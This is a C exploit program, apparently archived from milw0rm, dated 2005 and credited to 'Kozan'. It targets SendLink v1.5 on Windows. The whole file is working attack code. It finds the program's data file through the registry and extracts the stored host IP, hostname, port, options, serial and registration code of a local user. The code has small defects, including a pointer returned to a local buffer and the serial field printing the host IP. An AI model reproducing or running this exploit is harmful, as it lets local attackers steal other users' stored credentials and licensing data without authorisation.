/*****************************************************************

SendLink v1.5 Local Exploit by Kozan

Application: SendLink v1.5
Vendor:Computer Knacks
http://www.computerknacks.com/

Vulnerable Description: SendLink v1.5 discloses passwords to local users.

Discovered & Coded by: Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan[at]netmagister[dot]com

*****************************************************************/

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define BUFSIZE 100
HKEY hKey;
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

char *hostip, *hostname, *serial, *options, *regcode, *hostport;

int adresal(char *FilePath,char *Str)
{
      char kr;
      int Sayac=0;
      int Offset=-1;
      FILE *di;
      di=fopen(FilePath,"rb");

      if( di == NULL )
      {
              fclose(di);
              return -1;
      }

      while(!feof(di))
      {
              Sayac++;
              for(int i=0;i<strlen(Str);i++)
              {
                      kr=getc(di);
                      if(kr != Str[i])
                      {
                              if( i>0 )
                              {
                                      fseek(di,Sayac+1,SEEK_SET);
                              }
                              break;
                      }
                      if( i > ( strlen(Str)-2 ) )
                      {
                              Offset = ftell(di)-strlen(Str);
                              fclose(di);
                              return Offset;
                      }
              }
      }
      fclose(di);
      return -1;
}

char *oku(char *FilePath,char *Str)
{

      FILE *di;
      char cr;
          char BB = 0xBB;
      int i=0;
      char Feature[500];

      int Offset = adresal(FilePath,Str);

      if( Offset == -1 )
              return "";

      if( (di=fopen(FilePath,"rb")) == NULL )
              return "";

      fseek(di,Offset+strlen(Str),SEEK_SET);

      while(!feof(di))
      {
              cr=getc(di);
              if(cr == BB)
                          break;

              Feature[i] = cr;
              i++;
      }

      Feature[i] = '\0';
      fclose(di);
      return Feature;
}

int main(void)
{
       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                  0,
                  KEY_QUERY_VALUE,
                  &hKey) == ERROR_SUCCESS)
       {

               lRet = RegQueryValueEx( hKey, "ProgramFilesDir", NULL, NULL,
                                                               (LPBYTE)
prgfiles, &dwBufLen);

               if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) )
               {
                       RegCloseKey(hKey);
           printf("An error occured!\n");
                       return 0;
               }

      RegCloseKey(hKey);

       }
       else
   {
               RegCloseKey(hKey);
       printf("An error occured!\n");
               return 0;
       }

       strcat(prgfiles,"\\SendLink\\User\\data.eat");

       printf("SendLink v1.5 Local Exploit by Kozan\n");
       printf("Credits to ATmaCA\n");
       printf("www.netmagister.com  -  www.spyinstructors.com \n\n");

       try
       {
               char hostip_temp[BUFSIZE];
               wsprintf(hostip_temp,"hostip%c=%c",0xBB,0xAB);
               hostip=oku(prgfiles,hostip_temp);
               printf("Host IP: %s\n",hostip);

               char hostname_temp[BUFSIZE];
               wsprintf(hostname_temp,"hostname%c=%c",0xBB,0xAB);
               hostname=oku(prgfiles,hostname_temp);
               printf("Hostname                        : %s\n",hostname);

               char hostport_temp[BUFSIZE];
               wsprintf(hostport_temp,"hostport%c=%c",0xBB,0xAB);
               hostport=oku(prgfiles,hostport_temp);
               printf("Host Port                        : %s\n",hostport);

               char options_temp[BUFSIZE];
               wsprintf(options_temp,"options%c=%c",0xBB,0xAB);
               options=oku(prgfiles,options_temp);
               printf("Options                                : %s\n",options);

               char serial_temp[BUFSIZE];
               wsprintf(serial_temp,"serial%c=%c",0xBB,0xAB);
               serial=oku(prgfiles,serial_temp);
               printf("Serial                                : %s\n",hostip);

               char regcode_temp[BUFSIZE];
               wsprintf(regcode_temp,"regcode%c=%c",0xBB,0xAB);
               regcode=oku(prgfiles,regcode_temp);
               printf("Registration Code        : %s\n",regcode);

       }catch(...){ printf("An error occured!\n"); return 0; }

       return 0;

}

// milw0rm.com [2005-02-22]
